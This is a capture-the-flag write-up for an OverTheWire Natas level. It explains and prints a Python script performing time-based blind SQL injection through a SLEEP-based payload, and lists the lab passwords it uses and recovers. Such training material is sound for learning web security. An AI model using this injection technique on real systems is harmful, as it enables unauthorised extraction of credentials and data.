```
Username: natas17
Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
URL:      http://natas17.natas.labs.overthewire.org
```

- for this level, we get a field that asks for a username
- looking at the source code, i can see that the user input is used in a SQL query that checks if the username is in the database
- the result of the query is not given back to the user, so i cannot use a union attack
- also, the responses given if the username exists or not are commented out, so i cant use a boolean based attack either
- this leaves me with one option, a time-based attack
- i know the username is natas17, so i need to make a script for guessing the password, character by character, based on the time it takes for responses to reach back to me

```python
import requests
import re
from time import *

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
username = "natas17"
password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"

url = "http://natas17.natas.labs.overthewire.org"
session = requests.session()
current_pass = list()

while(True):
	for c in chars:
		print("Password: " + "".join(current_pass) + c)
		startT = time()
		response = session.post(url, data={"username": 'natas18" AND password LIKE BINARY "' + "".join(current_pass) + c + '%" AND SLEEP(2) #'}, auth=(username, password))
		endT = time()
		if endT - startT > 2:
			current_pass.append(c)
			break
	if len(current_pass) == 32:
		break
```

- this guesses each letter of the password, one by one
- **LIKE** is used for checking only the first 'n' letters, that can be followed by anything (represented by '%')
- **BINARY** is used to make sure the query is case sensitive
- if the current letter is the correct one, i use sleep(2) to increase the time of the response
- then i check for these longer responses and assemble the password one by one

# Password

- **6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ**
